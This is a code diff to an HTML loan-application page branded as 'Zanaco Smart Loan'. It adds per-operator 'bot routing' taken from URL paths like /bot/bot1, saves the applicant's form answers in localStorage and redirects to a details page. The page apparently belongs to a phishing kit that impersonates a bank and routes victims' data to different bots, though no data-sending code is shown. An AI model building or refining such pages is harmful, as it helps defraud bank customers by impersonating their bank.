@@ -68,7 +68,7 @@ button {
     <h2>Zanaco Smart Loan</h2>
 
     <div class="logo-container">
-        <img src="zanaco-dp.jpeg" class="logo">
+        <img src="/zanaco-dp.jpeg" class="logo">
     </div>
 
     <form id="loanForm">
@@ -115,10 +115,10 @@ button {
 </div>
 
 <script>
-// ---------------- BOT ROUTING (FIXED) ----------------
-// Extract botId from URL path: "/bot/bot1"
+// ---------------- BOT ROUTING FIX ----------------
+// Extract botId from URL path: "/bot/bot1" or "/bot/bot2"
 const pathParts = window.location.pathname.split('/');
-const botId = pathParts[2]; // index 0 = "", 1 = "bot", 2 = "bot1"
+const botId = pathParts[2]; // index 0 = "", 1 = "bot", 2 = "bot1" or "bot2"
 
 if (!botId) {
     alert("Invalid access link");
@@ -138,7 +138,7 @@ document.getElementById('loanForm').addEventListener('submit', e => {
     localStorage.setItem('employmentStatus', employmentStatus.value);
     localStorage.setItem('loanPurpose', loanPurpose.value);
 
-    // Redirect to next page WITHOUT query string
+    // Redirect to details.html, botId already in localStorage
     window.location.href = 'details.html';
 });
 </script>
